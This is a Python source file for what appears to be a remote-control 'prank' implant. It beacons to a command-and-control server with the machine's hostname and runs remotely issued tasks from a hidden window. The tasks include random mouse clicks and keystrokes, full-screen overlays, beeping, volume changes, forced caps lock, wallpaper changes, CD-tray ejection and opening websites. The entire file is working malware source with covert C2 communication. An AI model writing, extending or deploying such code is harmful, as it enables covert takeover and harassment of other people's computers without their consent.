# ==================================================================================================
# IMPORTS
# ==================================================================================================
import os
import sys
import socket
import uuid
import time
import requests
import threading
import subprocess
import random
import string

# Import GUI and action-specific libraries
import tkinter as tk
try:
    import pyautogui
    from PIL import Image, ImageTk
    import winsound
    import webbrowser
    import ctypes
    from comtypes import CLSCTX_ALL
    from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
except ImportError:
    pass # If on a non-Windows machine or missing libraries, it will fail gracefully.

# ==================================================================================================
# CONFIGURATION
# ==================================================================================================
C2_URL = "http://127.0.0.1:5003" # Replaced by the builder
HEARTBEAT_INTERVAL = 5 # More frequent heartbeats for responsiveness

# ==================================================================================================
# GLOBAL STATE VARIABLES FOR TOGGLED ACTIONS
# ==================================================================================================
NOISE_ACTIVE = False
RANDOM_CLICKING_ACTIVE = False
RANDOM_TYPING_ACTIVE = False
OVERLAY_WINDOW = None
GUI_ROOT = None # To hold the invisible main Tkinter window

# ==================================================================================================
# ACTION FUNCTIONS
# ==================================================================================================

# --- Annoyance Actions ---
def show_popup(title="Message", message="Hello!", style="ok"):
    """Shows a customizable popup using ctypes for a native look."""
    # This runs in a separate thread so it doesn't block the main payload loop.
    threading.Thread(target=lambda: ctypes.windll.user32.MessageBoxW(0, message, title, 0x40), daemon=True).start()

def _noise_loop():
    """The loop that generates beeping sounds."""
    while NOISE_ACTIVE:
        winsound.Beep(random.randint(200, 2000), 200)
        time.sleep(0.1)

def toggle_noise():
    """Starts or stops the noise-making thread."""
    global NOISE_ACTIVE
    NOISE_ACTIVE = not NOISE_ACTIVE
    if NOISE_ACTIVE:
        threading.Thread(target=_noise_loop, daemon=True).start()

def set_volume(level):
    """Sets the system volume from 0.0 to 1.0."""
    try:
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = ctypes.cast(interface, ctypes.POINTER(IAudioEndpointVolume))
        volume.SetMasterVolumeLevelScalar(level, None)
    except Exception as e:
        print(f"Failed to set volume: {e}")

# --- Destructive / Disruptive Actions ---
def open_website(url="https.youtube.com/watch?v=dQw4w9WgXcQ"):
    """Opens a specified URL in the default web browser."""
    webbrowser.open(url)

def force_caps_lock():
    """Forces the caps lock key to be enabled."""
    if ctypes.windll.user32.GetKeyState(0x14) == 0: # If caps lock is off
        ctypes.windll.user32.keybd_event(0x14, 0x45, 1, 0)
        ctypes.windll.user32.keybd_event(0x14, 0x45, 3, 0)

def open_cd_tray():
    """Opens and closes the CD tray."""
    try:
        ctypes.windll.winmm.mciSendStringW("set cdaudio door open", None, 0, None)
        time.sleep(3)
        ctypes.windll.winmm.mciSendStringW("set cdaudio door closed", None, 0, None)
    except Exception: pass

# --- Visual Actions ---
def _create_overlay(color='black', alpha=0.5):
    """Function to create the overlay window, run on the main GUI thread."""
    global OVERLAY_WINDOW
    if OVERLAY_WINDOW:
        OVERLAY_WINDOW.destroy()
    
    OVERLAY_WINDOW = tk.Toplevel(GUI_ROOT)
    OVERLAY_WINDOW.attributes('-fullscreen', True)
    OVERLAY_WINDOW.attributes('-alpha', alpha)
    OVERLAY_WINDOW.attributes("-topmost", True)
    OVERLAY_WINDOW.configure(bg=color)
    OVERLAY_WINDOW.overrideredirect(True) # Remove title bar

def hide_overlay():
    """Hides the overlay window."""
    global OVERLAY_WINDOW
    if OVERLAY_WINDOW:
        OVERLAY_WINDOW.destroy()
        OVERLAY_WINDOW = None

def change_wallpaper(image_path):
    """Changes the desktop wallpaper."""
    try:
        # SPI_SETDESKWALLPAPER = 20
        ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 3)
    except Exception as e:
        print(f"Failed to change wallpaper: {e}")

# --- Input Simulation ---
def _random_clicking_loop():
    screen_width, screen_height = pyautogui.size()
    while RANDOM_CLICKING_ACTIVE:
        pyautogui.click(random.randint(0, screen_width), random.randint(0, screen_height))
        time.sleep(random.uniform(0.5, 2.0))

def toggle_random_clicking():
    global RANDOM_CLICKING_ACTIVE
    RANDOM_CLICKING_ACTIVE = not RANDOM_CLICKING_ACTIVE
    if RANDOM_CLICKING_ACTIVE:
        threading.Thread(target=_random_clicking_loop, daemon=True).start()

def _random_typing_loop():
    chars = string.ascii_letters + string.digits + string.punctuation
    while RANDOM_TYPING_ACTIVE:
        pyautogui.write(random.choice(chars), interval=random.uniform(0.1, 0.3))
        time.sleep(random.uniform(0.5, 1.5))

def toggle_random_typing():
    global RANDOM_TYPING_ACTIVE
    RANDOM_TYPING_ACTIVE = not RANDOM_TYPING_ACTIVE
    if RANDOM_TYPING_ACTIVE:
        threading.Thread(target=_random_typing_loop, daemon=True).start()

# ==================================================================================================
# C2 COMMUNICATION & TASK PROCESSING
# ==================================================================================================

def process_tasks(tasks):
    """The main router for incoming commands from the C2 server."""
    if not tasks:
        return
        
    for task in tasks:
        command = task.get("command")
        args = task.get("args", {})
        
        print(f"[*] Received command: {command} with args: {args}")

        # Map command strings to functions
        ACTION_MAP = {
            "show_popup": show_popup,
            "toggle_noise": toggle_noise,
            "set_volume": set_volume,
            "open_website": open_website,
            "force_caps_lock": force_caps_lock,
            "open_cd_tray": open_cd_tray,
            "toggle_random_clicking": toggle_random_clicking,
            "toggle_random_typing": toggle_random_typing,
            "hide_overlay": lambda: GUI_ROOT.after(0, hide_overlay), # Schedule on main GUI thread
            "show_overlay": lambda: GUI_ROOT.after(0, lambda: _create_overlay(**args)),
        }
        
        if command in ACTION_MAP:
            try:
                # Call the function with its arguments
                ACTION_MAP[command](**args)
            except Exception as e:
                print(f"[!] Error executing command '{command}': {e}")

def c2_communication_loop():
    """The main loop for registering, heartbeating, and getting tasks."""
    session_id = str(uuid.uuid4())
    hostname = socket.gethostname()
    
    # Register with the C2 server
    try:
        requests.post(f"{C2_URL}/api/register", json={"session_id": session_id, "hostname": hostname}, timeout=10)
    except requests.RequestException:
        pass # Fail silently if C2 is down on first run

    # Main heartbeat loop
    while True:
        try:
            response = requests.post(f"{C2_URL}/api/heartbeat", json={"session_id": session_id}, timeout=10)
            if response.status_code == 200:
                data = response.json()
                if "tasks" in data:
                    process_tasks(data["tasks"])
        except requests.RequestException:
            pass # Fail silently if C2 is temporarily unreachable
        
        time.sleep(HEARTBEAT_INTERVAL)

# ==================================================================================================
# MAIN EXECUTION
# ==================================================================================================
if __name__ == "__main__":
    # Start the C2 communication in a separate thread
    c2_thread = threading.Thread(target=c2_communication_loop, daemon=True)
    c2_thread.start()
    
    # Create the main, invisible Tkinter window.
    # This is ESSENTIAL for GUI-based actions like overlays to work.
    # The payload will appear to have no GUI, but this keeps a Tkinter instance alive.
    GUI_ROOT = tk.Tk()
    GUI_ROOT.withdraw() # Hide the window
    
    # Start the Tkinter event loop. This will block, keeping the script alive.
    GUI_ROOT.mainloop()